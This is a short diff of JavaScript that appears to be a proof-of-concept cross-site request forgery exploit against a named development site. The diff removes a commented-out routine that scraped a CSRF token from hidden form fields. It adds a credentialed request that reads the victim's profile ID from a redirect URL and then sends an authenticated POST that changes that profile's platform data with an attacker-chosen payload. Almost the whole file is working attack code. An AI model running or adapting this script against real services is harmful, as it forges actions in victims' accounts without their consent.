@@ -4,22 +4,20 @@ var payload = {
     "audience_total": 3
 };
 var token = 'OzHthH9Lsxjyx1jQv3HCoFwv3jqdQkYwucXLnzjQwjWadqde6wjt9LcpKyqi4Kc5';
-/*function getcsrf(){
-    var url = 'https://dev.primetag.com/'
+var id = '';
+function getprofid(){
+    var url = 'https://dev.primetag.com/profile'
     var xhr = new XMLHttpRequest();
     xhr.onreadystatechange = function() {
         if (xhr.readyState == 4) {
-            var div = document.createElement('div');
-            div.innerHTML = xhr.responseText;
-            document.body.appendChild(div);
-            token = document.querySelectorAll('[type="hidden"]')[1].value;
+            id = xhr.responseURL.substr(xhr.responseURL.length - 4);
         };
     };
-    xhr.open('GET', url, true);
+    xhr.open('GET', url, true);xhr.withCredentials = "true";
     xhr.send(null);
-}*/
+}
 function postdata() {
-    var url = 'https://dev.primetag.com/api/profiles/1150/platforms/4';
+    var url = 'https://dev.primetag.com/api/profiles/'+id+'/platforms/4';
     var xhr = new XMLHttpRequest();
     xhr.onreadystatechange = function() {
         if (xhr.readyState == 4) {
@@ -32,5 +30,5 @@ function postdata() {
     xhr.withCredentials = "true";
     xhr.send(JSON.stringify(payload));
 };
-//getcsrf();
+getprofid();
 postdata();
